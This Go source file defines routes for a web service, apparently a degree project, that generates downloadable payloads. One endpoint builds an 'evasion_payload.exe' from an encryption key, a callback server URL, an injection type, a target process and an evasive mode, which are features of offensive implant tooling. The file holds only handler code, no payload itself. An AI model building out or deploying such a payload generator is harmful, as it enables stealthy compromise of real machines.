package routes

import (
	"net/http"
	"path/filepath"
	"proyecto_grado/builder"
	"proyecto_grado/controllers"
	"proyecto_grado/models"
	"proyecto_grado/services"

	"github.com/gin-gonic/gin"
)

func RegisterRoutes(r *gin.Engine) {
	r.POST("/generar", generarPayloadHandler)
	r.POST("/generar-evasion", generarEvasionHandler)
}
func RegisterScreenshotRoutes(r *gin.Engine) {
	r.POST("/screenshot", controllers.ScreenshotHandler)

	r.Static("/tmp", "./tmp")
}

func RegisterPingRoutes(r *gin.Engine) {
	r.POST("/ping", controllers.PingHandler)
}
func generarPayloadHandler(c *gin.Context) {
	var req models.PayloadRequest
	if err := c.BindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "JSON inválido"})
		return
	}

	output, err := services.GeneratePayload(&req)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{
			"error":   "Error generando payload",
			"detalle": err.Error(),
		})
		return
	}

	c.Header("Content-Disposition", "attachment; filename="+filepath.Base(output))
	c.Header("Content-Type", "application/octet-stream")
	c.File(output)
}

func generarEvasionHandler(c *gin.Context) {
	var req models.EvasionRequest
	if err := c.BindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "JSON inválido"})
		return
	}

	output := filepath.Join("..", "bin", "evasion_payload.exe")
	err := builder.BuildEvasion(
		output,
		req.EncryptionKey,
		req.ServerURL,
		req.InjectionType,
		req.TargetProcess,
		req.EvasiveMode,
	)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{
			"error":   "Error generando evasion payload",
			"detalle": err.Error(),
		})
		return
	}

	c.Header("Content-Disposition", "attachment; filename=evasion_payload.exe")
	c.Header("Content-Type", "application/octet-stream")
	c.File(output)
}
